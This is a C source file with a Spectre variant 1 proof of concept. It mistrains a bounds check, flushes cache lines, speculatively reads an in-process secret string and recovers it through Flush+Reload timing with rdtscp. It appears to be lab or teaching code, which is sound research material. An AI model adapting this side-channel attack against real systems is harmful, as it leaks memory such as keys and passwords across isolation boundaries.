#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_THRESHOLD (100)
#define DELTA 1024

unsigned int limitu = 10;
unsigned int limitl = 0;
uint8_t array[256 * 512];
uint8_t data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
char *secret_token = "CACHE ME IF YOU CAN";
uint8_t temp;

void flushCache()
{

  int i;
  for (i = 0; i < 256; i++)
    array[i * 512 + DELTA] = 1;

  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 512 + DELTA]);
}

void reloadCache()
{

  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;

  for (i = 0; i < 256; i++)
  {
    addr = &array[i * 512 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 < CACHE_THRESHOLD && i != 0)
      printf("The secret %d was stored in cache, value: %c.\n", i, i);
  }
}

void getDataPaperImplementation(size_t x)
{

  if (x < limitu && x > limitl)
  {
    //_mm_lfence(); -- PREVENT SPECULATIVE EXECUTION
    array[data[x] * 512 + DELTA] += 1;
  }
}

void spectreAttackAddressCalculated(int j)
{

  int i;
  uint8_t s;
  volatile int z;

  for (i = 1; i < 10; i++)
    getDataPaperImplementation(i);

  size_t addr_token = (size_t)(secret_token - (char *)data + j);
  _mm_clflush(&limitu);
  _mm_clflush(&limitl);
  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 512 + DELTA]);
  for (z = 0; z < 1000; z++)
    ;
  getDataPaperImplementation(addr_token);
}

int main()
{
  for (int j = 0; j < 19; j++)
  {
    flushCache();
    usleep(10);
    spectreAttackAddressCalculated(j);
    reloadCache();
  }
  return 0;
}
